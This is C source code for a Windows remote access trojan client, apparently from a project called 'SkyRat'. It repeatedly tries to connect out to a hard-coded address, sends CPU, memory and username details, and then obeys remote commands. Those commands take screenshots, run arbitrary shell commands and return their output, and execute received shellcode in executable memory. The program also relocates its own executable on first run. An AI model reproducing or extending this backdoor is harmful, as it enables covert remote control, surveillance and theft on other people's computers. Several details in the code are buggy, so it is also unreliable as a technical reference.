#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <lmcons.h>
#include <stdint.h>
#include <windows.h>
#include "screen.h"

char* path = "C:\\msys64\\home\\22noa\\projects\\SkyRat\\build\\test";
char* file_name = "\\client.exe";

SOCKET sock;

char buf[1024];
char response[1024];
char total[18384];

void start_sockets();
/*
char* space(char* drive) {
  uint64_t free;  
  GetDiskFreeSpaceEx(drive, NULL, NULL, (PULARGE_INTEGER) &free);
  char buf[1024];
  sprintf(buf, "Free Space On %c Drive: %I64u GB", drive[0], (free / (1024*1024)) / 1024);
  return buf;
}

void drives() {
  char names[MAX_PATH];
  GetLogicalDriveStrings(MAX_PATH, names);
  char* name_ptr = names;
  while(*name_ptr) {
    char add_slash[5];
    strcpy(add_slash, name_ptr);
    strcat(add_slash, "\\");
    space(add_slash); 
    name_ptr += strlen(name_ptr) + 1;
  }  
}
*/
void mem_details(char* memory) { // prints the percentage of used ram and the total ram in gb
  MEMORYSTATUSEX mem;
  mem.dwLength = sizeof(mem);
  GlobalMemoryStatusEx(&mem);
  sprintf(memory, "%lld GB", mem.ullTotalPhys / 1073741824);
}

void cpu_details(char* speed) {
  DWORD buf_size = MAX_PATH;
  DWORD mhz = MAX_PATH;
  HKEY key;
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &key); // get handle of the cpu value key
  RegQueryValueEx(key, "~MHz", NULL, NULL, (LPBYTE) &mhz, &buf_size); // get the key value that's set on start
  double ghz = (double)mhz / 1000.f; // sick maths big maths
  sprintf(speed, "%.2f GHz", ghz);
 }

void user_details(char* name) { // prints the user's name registers on the computer needed to include lan manager header to get UNLEN or the max length of a name
  DWORD len = (DWORD)(sizeof(name) / sizeof(name[0]));
  GetUserName(name, &len);
}

void talk(struct addrinfo* ai) {
  char cpu_buf[1024];
  cpu_details(cpu_buf);
  send(sock, cpu_buf, sizeof(cpu_buf), 0);

  char mem_buf[1024];
  mem_details(mem_buf);
  send(sock, mem_buf, sizeof(mem_buf), 0);
  
  char user_buf[UNLEN+1];
  user_details(user_buf);
  send(sock, user_buf, sizeof(user_buf), 0);
  
  for(;;) {
    ZeroMemory(buf, sizeof(buf));
    ZeroMemory(response, sizeof(response));
    ZeroMemory(total, sizeof(total));

    int recv_sz = recv(sock, buf, sizeof(buf), 0);
    if((recv_sz == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET) || !strcmp(buf, "restart")) {
      printf("client disconnected\n");
      freeaddrinfo(ai);
      closesocket(sock);
      WSACleanup();
      start_sockets();
    }
    else if(buf[0] == 'c' && buf[1] == 'd') {
      char* cd_buf = buf;
      SetCurrentDirectory(cd_buf + 3);
      sprintf(total, "Current Directory: '%s' \n", cd_buf + 3);
      send(sock, total, sizeof(total), 0);
    }
    else if(buf[0] == 's' && buf[1] == 's') {
      take_screenshot("ss.bmp", sock);
    }
    else if(buf[0] == 's' && buf[1] == 'c') {
      BYTE* code_buf = (BYTE*)strtok(buf, "cd ");
      void* pcode = VirtualAlloc(0, sizeof(code_buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      memcpy(pcode, code_buf, sizeof(code_buf));
      WaitForSingleObject(CreateThread(0, (LPTHREAD_START_ROUTINE)pcode, 0, 0, 0, 0), INFINITE);
      sprintf(total, "Shellcode Executed\n");
      send(sock, total, sizeof(total), 0);
    }
    else if(!strcmp(buf, "clean")) {
      freeaddrinfo(ai);
      closesocket(sock);
      WSACleanup();
      exit(0);
    } else {
      FILE* fp;
      fp = popen(buf, "r");
      while(fgets(response, sizeof(response), fp)) {
	strcat(total, response);
      }
      send(sock, total, sizeof(total), 0);
    }
  }
}

void start_sockets() {
  WSADATA wsadata; 
  ZeroMemory(&wsadata, sizeof(wsadata));
  struct addrinfo hints;
  struct addrinfo* ai;
  ZeroMemory(&hints, sizeof(hints));
  if(WSAStartup(MAKEWORD(2,2), &wsadata) != 0) { // init winsock2 version 2.2
    printf("Failed at Winsock2 Startup!\n");
    Sleep(5000);
    exit(1);
  }

  /* fill out hints */
  hints.ai_family = AF_UNSPEC; 
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;

  if(getaddrinfo("192.168.1.123", "50005", &hints, &ai) != 0) {
    printf("Failted at getaddrinfo call!\n");
    Sleep(5000);
    WSACleanup();
    exit(1);
  }
  
  sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
  if(sock == INVALID_SOCKET) {
    printf("Failted Creating a Socket!\n");
    Sleep(5000);
    WSACleanup();
    freeaddrinfo(ai);
    exit(1);
  }
  
  while(connect(sock, ai->ai_addr, ai->ai_addrlen) != 0) {
    Sleep(5000);
  }
  printf("client has connected\n");
  talk(ai);
}

int main(void) {
//HWND hwindow = FindWindow("ConsoleWindowClass", 0);
//ShowWindow(hwindow, 0);

  char log[MAX_PATH];
  sprintf(log, "%s\\log.txt", path);
  if(GetFileAttributes(log) == INVALID_FILE_ATTRIBUTES) {
    FILE* fp;
    fp = fopen(log, "w+");
    fclose(fp);
    char path_buf[MAX_PATH];
    GetCurrentDirectory(sizeof(path_buf), path_buf);
    strcat(path_buf, file_name);
    char new_path[MAX_PATH];
    sprintf(new_path, "%s%s", path, file_name);
    MoveFileExA(path_buf, new_path, MOVEFILE_REPLACE_EXISTING);
  }
  
  start_sockets();
  
  return 0;
}
